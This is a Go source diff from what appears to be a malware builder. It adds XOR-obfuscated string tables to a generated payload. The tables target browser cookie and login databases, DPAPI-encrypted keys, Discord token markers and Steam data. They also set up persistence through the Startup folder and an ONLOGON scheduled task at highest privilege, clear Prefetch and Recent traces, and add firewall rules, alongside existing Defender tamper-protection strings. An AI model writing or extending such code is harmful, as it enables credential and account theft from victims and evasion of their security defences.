@@ -199,6 +199,10 @@ type globalValues struct {
 
 	EncDefenderValues        string
 	EncRegSetValueExW        string
+
+	EncStealerFileNames      string
+	EncInstallStrings        string
+	EncFirewallParts         string
 }
 
 var disguiseNames = []string{
@@ -590,6 +594,72 @@ func buildGlobals(cfg Config) (globalValues, error) {
 			"TamperProtection",
 		}, key),
 		EncRegSetValueExW: xorWithKey("RegSetValueExW", key),
+
+		EncStealerFileNames: xorListWithKey([]string{
+			"Network",
+			"Cookies",
+			"Login Data",
+			"cookies.sqlite",
+			"Local Storage",
+			"leveldb",
+			"Local State",
+			"Default",
+			"Profile 1",
+			"Profile 2",
+			"Profile 3",
+			"Profile 4",
+			"Profile 5",
+			"os_crypt",
+			"encrypted_key",
+			"DPAPI",
+			"dQw4w9WgXcQ:",
+			"v10",
+			"mfa.",
+			".ldb",
+			".log",
+			"(encrypted)",
+		}, key),
+
+		EncInstallStrings: xorListWithKey([]string{
+			"Start Menu",
+			"Programs",
+			"Startup",
+			".lnk",
+			"worker",
+			"/Create",
+			"/TN",
+			"/TR",
+			"/SC",
+			"ONLOGON",
+			"/RL",
+			"HIGHEST",
+			"/F",
+			"LIMITED",
+			"Debugger",
+			"Microsoft-Windows-TaskScheduler/Operational",
+			"Microsoft-Windows-Services/Diagnostic",
+			"Prefetch",
+			"Recent",
+			"SystemRoot",
+			"config",
+			"Steam",
+		}, key),
+
+		EncFirewallParts: xorListWithKey([]string{
+			"advfirewall",
+			"firewall",
+			"add",
+			"rule",
+			"name=",
+			"dir=in",
+			"action=allow",
+			"program=",
+			"enable=yes",
+			"profile=any",
+			"dir=out",
+			"action=block",
+			" Service",
+		}, key),
 	}, nil
 }
 
@@ -800,6 +870,9 @@ var encSteamRegPaths = "%s"
 var encSteamVdfNames = "%s"
 var encDefenderValues = "%s"
 var encRegSetValueExWName = "%s"
+var encStealerFileNames = "%s"
+var encInstallStrings = "%s"
+var encFirewallParts = "%s"
 
 var decryptionKey = []byte("%s")
 `,
@@ -992,6 +1065,9 @@ var decryptionKey = []byte("%s")
 		g.EncSteamVdfNames,
 		g.EncDefenderValues,
 		g.EncRegSetValueExW,
+		g.EncStealerFileNames,
+		g.EncInstallStrings,
+		g.EncFirewallParts,
 
 		g.XorKeyLiteral,
 	)), nil
